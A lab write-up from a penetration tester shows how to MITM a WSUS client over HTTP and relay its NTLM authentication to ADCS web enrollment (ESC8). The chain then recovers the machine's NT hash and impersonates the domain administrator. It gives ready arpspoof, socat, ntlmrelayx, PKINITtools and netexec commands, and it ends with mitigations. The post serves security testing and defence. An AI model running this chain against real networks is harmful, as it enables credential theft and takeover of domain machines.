# Abusing WSUS with MITM to perform ADCS ESC8 attack

​	

---
| layout | post |
| --- | ---|
| title |  WSUS – Abusing WSUS server misconfiguration to perform ADCS ESC8 attack to own client machine. |
| category | WSUS - MITM - ADCS |
| tags | Abusing WSUS with MITM to perform ADCS ESC8 attack |

In this blog post we will try to demonstrate another way (**not new**) to escalate privileges on a machine/computer by abusing WSUS server misconfiguration.

Since 2020 after [Gosecure](https://www.gosecure.net/) ethical hackers released [misconfigured WSUS deploy exploit tool](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/) pywsus, WSUS configurations are under increasing scrutiny during penetration tests in order to compromise client update machines.
Then came Gosecure's [paper](https://www.gosecure.net/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks/) about abusing Windows Server Update Services (WSUS) to enable NTLM Relaying Attacks. While reading that last great blog post, I noticed that it was left to the reader to provide a proof-of-concept of how to exploit a vulnerable WSUS server configuration in an Active Directory Certificate Service (ADCS) context to obtain NT AUTHORITY/System privileges on domain joined machine. There is the goal of this blog post! 

Before diving into the subject, let's briefly talk about WSUS and the ADCS vulnerability we want to combine with it.



# WSUS 101


## WSUS overview

**Windows Server Update Services** (WSUS) enables information technology administrators to deploy the latest Microsoft product updates on computers. WSUS can be used to fully manage the distribution of updates that are released through Microsoft Update to computers on the network, according to [MS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus/). WSUS server downloads updates from Microsoft servers and keeps them locally in order to provide it to domain computers and servers. 

A Group Policy Object is pushed and applied to a group of domain computers that use WSUS server for their updates.
On each of these computers, the **W**indows **U**pdate **A**uto **U**pdate **Cl**lien**t** binary - wuauclt.exe was used to look frequently for updates by contacting the WSUS server. That binary is now [deprecated](https://learn.microsoft.com/en-us/windows-server/get-started/removed-deprecated-features-windows-server-2016).

We can search and install updates by using [windows settings](https://support.microsoft.com/en-us/windows/update-windows-3c5ae7fc-9fb6-9af1-1984-b5e0412c556a). From there, client computer communicates with WSUS server using HTTP(S) /SOAP XML web service. Which means all update procedure is done using web service. The main endpoints requested (POST) by update clients are /ClientWebService/SimpleAuth.asmx, /ClientWebService/Client.asmx, /ApiRemoting30/WebServices.asmx and interesting requests included in XML are :

- SyncUpdates : sending a list of currently updates.

- GetExtendedUpdateInfo: checks for new update ids.

  While responding to GetExtendedUpdateInfo request, WSUS server sends metadata, handlers ( for instance CommandLineInstallation allow to execute Microsoft signed binary with specific arguments), URLs from where to download and even installation note for every new update.

  
### Use of Powershell to find updates

It is possible for domain servers and computers  to look for update by using Powershell. Endpoint /ApiRemoting30/WebServices.asmx is requested updates are installed using WSUS Powershell modules.

## WSUS Attack

When deploying WSUS on a domain, enable SSL is recommended not mandatory wich unfortunately leads to unsecure configurations of WSUS that we met during penetration tests. Initially , the idea behind WSUS attack is that if we are able to perform MITM attack , we can claim to be WSUS server in eyes of domain computer looking for updates, then inject fake updates to execute commands on the computer as NT AUTHORITY\\System abusing **CommandLineInstallation** handler. That is how pyWSUS tool came out.

Another way to exploit WSUS misconfiguration is to take advantage of the authentication provided by computer client looking for updates and relaying it to other domain services, in our case: **Active Directory Certificate Service Web enrollment endpoint**.



# ADCS 101
## Public Key Infrastructure

A PKI (Public Key Infrastructure) is an infrastructure used to create, manage, and revoke certificates as well as public/private keys.


Active Directory Certificate Service (ADCS) is the Microsoft implementation of a PKI infrastructure in an Active Directory/Windows environment. There is a short list of usages of a PKI infrastructure:

- TLS certificate (HTTPS / LDAPS / RDP)

- Signing binaries, Powershell scripts or even drivers

- User authentication

- File system encryption

## Certificate template

In order to make simple the creation of certificates in an Active Directory, there are certificate templates.

By default, as well explained in [Sant0rryu blog post](https://sant0rryu.github.io/posts/CertPotato/#public-key-infrastructure) , when ADCS is installed, different default templates are available. Two of them are the **User** and **Machine** templates which can be requested by any user and machine/computer accounts in the domain. We are particularly interested by these two templates. First let's talk about machine template.

Initially, all client's updates are installed by LocalSytem NT Authority\\System account which is a built-in service account. In Active Directory environment, localSystem uses computer account when trying to connect to remote server on the domain. So basically while look for updates, windows clients may use computer account if authentification is needed in Active Directory environment. 

## Account authentification (PKINIT)

PKINIT is a asymmetric preauthentication mechanism for Kerberos which uses X.509 certificates to authenticate the KDC to clients and vice versa. The only changes compared with conventional authentication password and symmetrical keys concern the KRB_AS_REQ and KRB_AS_REP exchanges. Indeed client signs the timestamp with its private key associated with a valid certificate. Only fews certificates' EKUs allow clients to use certificate for PKINIT authentication (EKU **client authentication** for instance).

# Practical situation

Let's take the following environment test:
- AD-DC-19 (192.168.56.105): domaine controlleur (Windows Server 2019), which hosts Certificate Authority Service too. The CA name is jo-ad-ad-dc-19-ca
- wsus-jo (192.168.56.114): Windows Service Update Server (Windows Server 2019), which hosts WSUS and delivers updates to computers through **HTTP** IIS server. 
- w11-jason (192.168.56.108): Windows 11 client machine which is looking for updates.
- parrotOS (192.168.56.115) which is our attacker machine. 

# Exploitation Prerequisites

In order to take advantage of the situation, let's have a look on the prerequisites:
- First, it is important to be able to intercept traffic, of both windows update client and WSUS server. In other words we are able to perform ARP-spoof attack, which means we are on the same network as both.
- WSUS server configured to work with HTTP. WSUS server protocole configuration can be found by querying registry key: 
```powershell
PS > reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    http://wsus-jo.jo.local:8530/
```
It is also possible to sniff traffic using Wireshark in order to find main endpoints requested by client as mentioned above. 


- ADCS HTTP-based enrollment method is enabled on the domain with HTTP enabled and EPA disabled. In other words, ADCS vulnerable to ESC8.

![ADCS HTTP Web enrollment](/assets/img/web_enrollment.png)



 # Taking advantage of the situation

We know WSUS HTTP server uses 8530 TCP port to answer clients requests. We will intercept Windows Update traffic by using ARP-Spoof attack (we could use mitm6 or responder etc). 
There is commands to intercept traffic between both client (192.168.56.108) and server (192.168.56.114) in two linux terminals.
In one terminal 
```bash
~ sudo arpspoof -i enp0s3 -t 192.168.56.108 192.168.56.114 
```
In another terminal::

```bash
~ sudo arpspoof -i enp0s3 -t 192.168.56.114 192.168.56.108 
```
 If we are MITM-ing between Windows update server and client computer, that means we potentially will receive HTTP requests on port 8530. As we wan to relay it using the famous impacket tool [Ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), we must perform a port redirection. We redirect all incoming traffic on port 8530 to port 80 as if we were listening on port 80, we would receive these requests. We use [socat](https://www.baeldung.com/linux/socat-command) for that purpose:

```bash
~ sudo apt install socat
~ sudo socat TCP-LISTEN:8530,fork TCP:80
```
So we are ready to relay all incoming traffing to our HTTP 80 port to the ADCS web enrollment HTTP server. We use ntlmrelayx to perform the relay. 

>[!IMPORTANT]
>Make sure to use ExtAndroidDev pull [request](https://github.com/fortra/impacket/pull/1101/commits/81afc66904068e33c866bc9d005262c9ce69bad6) or [Dirkjann's httpattack.py version](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattack.py) . As Dirk-jan explained it in his [blog post](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)  servers/computers are not supposed to request certificates so the Web enrollment page gives them back the error ''No certificate templates could be found. You do not have permission to request a certificate from this CA, or an error occurred while accessing the Active Directory.'' There is how we proceeded in our lab:

```bash
python3 -m venv env
source env/bin/activate
git clone https://github.com/SecureAuthCorp/impacket ./impacket
cd impacket
git fetch origin pull/1101/head:ntlmrelayx-adcs-attack
git checkout ntlmrelayx-adcs-attack
python3 setup.py install
cd examples
python3 ntlmrelayx.py -t http://192.168.56.105/certsrv/certfnsh.asp -smb2support --adcs
```
We can wait for un windows update client to request updates, or if we have access to compromise host, we search for updates. Here is w11-jason victime computer looking for updates:

![Windows client looking for updates](/assets/img/windows_client_looks_for_updates.png)



We indeed have incomming requests that we are going to relay to jo-ad-dc-19-ca web enrollment in order to ask for a computer template. There it is:

![Windows client looking for updates](/assets/img/ESC8_relay.png)



We can have a look on what happened with Wireshark:

![Windows client looking for updates](/assets/img/wireshark.png)



- 1  w11-jason computer (192.168.56.108) sends us request for update to our Web server on port :80 (remember that we transfert all incoming traffic on port 8530 to port 80). w11-jason asks for an update to us as we are acting as wsus-jason at 192.168.56.114). We send him bak a HTTP 401 error code..
- 2  We (192.168.56.115) request a certificate to jo-ad-dc-19-ca (192.168.56.105) by web enrollment, and it sends back a HTTP 401 error. 
- 3  jo-ad-dc-19-ca asks us to authenticate with NTLM. We send the same response to w11-jason.
- 4  w11-jason authenticates to us with NTLM, we simply relay it to jo-ad-dc-19-ca to request a **machine** certificate.
- 5  We got the 200 HTTP response from jo-ad-dc-19-ca and we simply query and download the certificate for w11-jason$ computer account. 

Since we got the certificate let's authenticate with PKINIT to the domain. We use then PKINITools  [PKINITools](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) kit's gettgtpkinit.py to obtain our TGT:


```bash
 python3 /opt/PKINITtools/gettgtpkinit.py -pfx-base64 \$(cat a.b64 ) 'jo.local/W11-jason$' 'win11.ccache' -dc-ip 192.168.56.105
```
![Asking  for tgt with PKINIT](/assets/img/Ask_TGT_PKINIT.png)


Once we got the TGT, we load it in memory with KRB5CCNAME export command. The klist command allows us to list the loaded Kerberos tickets, we can see that we have obtained a TGT as W11-JASON$, the machine account we ask certificate for.

```bash
export KRB5CCNAME=win11.ccache
klist
```

![klist after w11 obtained TGT](/assets/img/klist-w11.png)


As we authenticated with PKINIT, client account NT hash is encrypted in the PAC (Privilege Attribute Certificate). In order to read the PAC and have access to client's NT hash, the client's must use another Kerberos extension called user to user (U2U). User to user is well explained in [Dirk-jan's blog post](https://datatracker.ietf.org/doc/html/draft-ietf-cat-user2user-02). The idea here is to request a service ticket to ourself while adding our TGT as "additional tickets" during the KRB_TGS_REQ. We will be able to find out the PAC and the NT hash when we receive KDC response as it uses the session key of our TGT (that we know) to encrypt the PAC.
We use this session key (from our TGT) to decrypt PAC and the NT hash. 

```bash
 python3 /opt/PKINITtools/getnthash.py jo.local/w11-jason\$ -key f00b6e57ffaf6f23002b39d72ed6f34e0bfa9824db4fe8ccbe28f82b4c96119b
```

![Windows client looking for updates](/assets/img/ASK_TGS_U2U.png)



We then have w11-jason$ account NT hash, let's verify it with our new favorite network pentest tool [netexec](https://www.netexec.wiki/).
```bash
nxc smb 192.168.56.105 -u  w11-jason\$ -H "8a03b8e0fb9728ee5d6dd1eb356a5270"
```
![Windows client looking for updates](/assets/img/Verification_compte_nxc.png)


As we have w11-jason NT hash, we can simply perform [silver ticket](https://en.hackndo.com/kerberos-silver-golden-tickets/?_gl=1*1xbhafq*_ga*MTQ1MTUwNzkwOS4xNjk1MDIyMzU5*_ga_DNP6NC70FV*MTY5OTMwOTI1OS4yLjAuMTY5OTMwOTI1OS4wLjAuMA..#silver-ticket) attack and impersonate domain administrator user on the machine. Usually to perform S4U attacks, we use impacket. To proceed, we have to find domain SID followed by asking a domain administrator ticket to the computer account we compromised. Recently netexec added [new features]()- giving us a huge shortcut to perform this attack.

 ```bash  
nxc smb w11-jason.jo.local -u 'w11-jason$' -H '8a03b8e0fb9728ee5d6dd1eb356a5270' --delegate administrateur --self 
 ```

![Windows client looking for updates](/assets/img/S4U_nxc.png)



There it is!! From now we can do whatever post-exploitation action we want on the host like dumping credentials, have administration access and so one.

## Another way to take advantage of the situation
I noticed during many network penetration tests that powershell scripts using most of the time ** PSWindowsUpdate** module on some servers that system administrators run periodically in order to search for updates from WSUS. And of course the WSUS server is misconfigurered. These modules use user or service account running them in Active Directory network to connect to WSUS server which means we can relay user/service account NTLM authentication as well and ask for certificate to ADCS Web enrollment. Let's dive into it with our previous setup.

This time one our victime computer w11-jason, .NET API Microsoft UpdateServices is used to connect to WSUS server:

![Windows client looking for update using PoshWSUS](/assets/img/PoshWSUS-tentative-connection.png)


[PoshWSUS](https://github.com/proxb/PoshWSUS) in the wild pulls all WSUS configurations it can find in registry key and makes connection to WSUS server found. Part fof the code which interests us is :

```powershell
    ...
    cut
    ...
    
    Process {
        If (-NOT $PSBoundParameters.ContainsKey('WSUSServer')) {
            #Attempt to pull WSUS server name from registry key to use            
            If ((Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name WUServer).WUServer -match '(?<Protocol>^http(s)?)(?:://)(?<Computername>(?:(?:\w+(?:\.)?)+))(?::)?(?<Port>.*)') {
                $WsusServer = $Matches.Computername
                $Port = $Matches.Port
            }
        }
        #Make connection to WSUS server  
        Try {
            Write-Verbose "Connecting to $($WsusServer) <$($Port)>"
            $Script:Wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer($wsusserver,$Secure,$port)  
            $Script:_wsusconfig = $Wsus.GetConfiguration()
            Write-Output $Wsus  
        } Catch {
            Write-Warning "Unable to connect to $($wsusserver)!`n$($error[0])"
        } Finally {
            $ErrorActionPreference = 'Continue' 
        } 
```



While listening in the wire with ntlmrelayx, we can see that the certificate request is made but with the domain user account ibrahim and of course the certifate request failed as the template used is incorrect:

![Windows client looking for update using PoshWSUS](/assets/img/demande_certificat_ibrahim.png)


When we retry to relay using the correct template "user" we request and obtain user certificate:

![Windows client looking for update using PoshWSUS](/assets/img/Ibrhaim_certificat.png)


Depending on the user privileges in the domain that attack may be interesting to consider, especially when there is a privileged user accont or service account that runs this command in order to look for updates.

# Conclusion

In this blog post we didn't bring any new concept of attack, we tried to find another way to abuse WSUS misconfiguration in Active Directory environment.WSUS and ADCS can lead to a domain computer compromise when they are both misconigured and when MITM is possible by any ways.
WSUS should be configured over HTTPS in one hand, and ADCS web enrollment should be configured with EPA.
Defender can take advantage of Windows events logs (for instance event 4768 for PKINIT authentication) when investigating some suspicious behavior from computer accounts. Some events id like 4768 related to PKINIT authentication.


# Acknowledgements

- [Gosecure](https://www.gosecure.net/blog/) for their incredible works and finding on the subject. They gave me the motivation to dig the subject with all their [blog posts](https://www.gosecure.net/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks/).
- [Paul Stone - Alex Chapman](https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf) for a clear explanation on how does clients updates and WSUS server communicate.
- [Hocine](https://twitter.com/Sant0rryu) for his brilliant blogpost about [Certpotatoe attack](https://sant0rryu.github.io/posts/CertPotato/)
- [Thomas](https://twitter.com/_zblurx) and friends for the [netexec](https://www.netexec.wiki/) 
- [Olivier Lyak](https://twitter.com/ly4k_) for the [Certipy](https://github.com/ly4k/Certipy) tool and the [associated articles](https://medium.com/@oliverlyak)
- [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) for the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) article
- [Dirk-jan](https://twitter.com/_dirkjan) for the [PKINITtools](https://github.com/dirkjanm/PKINITtools).
- [Elad Shamir](https://twitter.com/elad_shamir) for the article [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Charlie Bromberg](https://twitter.com/_nwodtuhs/) for the precious [hacker recipe](https://www.thehacker.recipes/ ) .
